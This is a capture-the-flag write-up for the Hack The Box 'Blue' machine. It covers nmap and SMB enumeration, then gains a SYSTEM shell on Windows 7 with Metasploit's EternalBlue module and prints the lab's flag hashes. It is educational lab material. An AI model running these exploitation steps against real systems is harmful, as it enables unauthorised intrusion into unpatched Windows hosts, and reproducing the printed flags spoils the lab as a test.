# Blue 
## IP 
> 10.10.10.40

## nmap scan

```
nmap -T4 -p- -A 10.10.10.40 -Pn
```

```a
Nmap scan report for 10.10.10.40
Host is up (0.061s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:

Network Distance: 2 hops
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -17m53s, deviation: 34m37s, median: 2m04s
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-07-30T03:47:25+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-07-30T02:47:26
|_  start_date: 2021-07-30T02:42:31

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   112.12 ms 10.10.16.1
2   33.63 ms  10.10.10.40
```

## System Info 
> OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
 Computer name: haris-PC

## Open Ports
       

> 445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
> 
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn

Both SMB 


> 135/tcp   open  msrpc        Microsoft Windows RPC

RPC

## rcpinfo

```rpcinfo -p 10.10.10.40```

> 10.10.10.40: RPC: Remote system error — Connection refused
## smbclient

```
smbclient -L \\\\10.10.10.40\\
```

![Image 1](https://github.com/MiguelCaputo/CTFs-writeups/blob/main/Hack%20The%20Box/Blue/Pasted%20image%2020210729225254.png)

IPC$ ```smbclient \\\\10.10.10.40\\IPC$``` Empty

ADMIN$ ```smbclient \\\\10.10.10.40\\ADMIN$``` Access Denied 

C$ ```smbclient \\\\10.10.10.40\\C$``` Access Denied 

Users ```smbclient \\\\10.10.10.40\\Users``` Rabbit Hole

Share ```smbclient \\\\10.10.10.40\\Share``` Empty

## Metasploit 
Tried finding SMB version, I did not find any new information 

I looked online for "windows 7 professional sp1 6.1 smb exploit" and found this [rapid7 link](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)

I tried the exploit and set the options and was able to create a shell 

```
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set rhosts 10.10.10.40
set lhost tun0
run
```

## Post Exploitation Information

```getuid``` Server username: NT AUTHORITY\SYSTEM == We are root

```sysinfo```

![Image 1](https://github.com/MiguelCaputo/CTFs-writeups/blob/main/Hack%20The%20Box/Blue/Pasted%20image%2020210729230442.png)


#### Finding user.txt

```
cd c:\
cd Users
cd haris
cd Desktop
type user.txt
```

>
4c546aea7dbee75cbd71de245c8deea9

#### Finding root.txt

```
cd c:\
cd Users
cd Administrator
cd Desktop
type root.txt
```

>
ff548eb71e920ff6c08843ce9df4e717
